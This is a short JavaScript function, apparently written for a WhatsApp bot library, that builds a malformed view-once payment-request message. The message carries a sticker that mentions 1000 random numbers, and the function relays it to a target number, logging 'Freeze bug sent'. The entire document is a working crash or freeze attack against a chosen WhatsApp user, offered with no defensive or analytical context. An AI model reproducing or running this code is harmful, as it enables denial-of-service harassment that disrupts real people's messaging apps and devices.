async function FreezeClick(client, target) {
    const msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                requestPaymentMessage: {
                    currencyCodeIso4217: "IDR",
                    amount1000: "9999",
                    requestFrom: target,
                    noteMessage: {
                        stickerMessage: {
                            url: "https://mmg.whatsapp.net/...",
                            mimetype: "image/webp",
                            height: 440,
                            width: 440,
                            contextInfo: {
                                mentionedJid: Array.from({ length: 1000 }, (_, i) => `1${Math.floor(Math.random() * 100000)}@s.whatsapp.net`),
                                participant: target
                            }
                        }
                    }
                }
            }
        }
    }, {});
    await client.relayMessage(target, msg.message, { participant: { jid: target }, messageId: msg.key.id });
    console.log(`✅ Freeze bug sent to ${target}`);
}
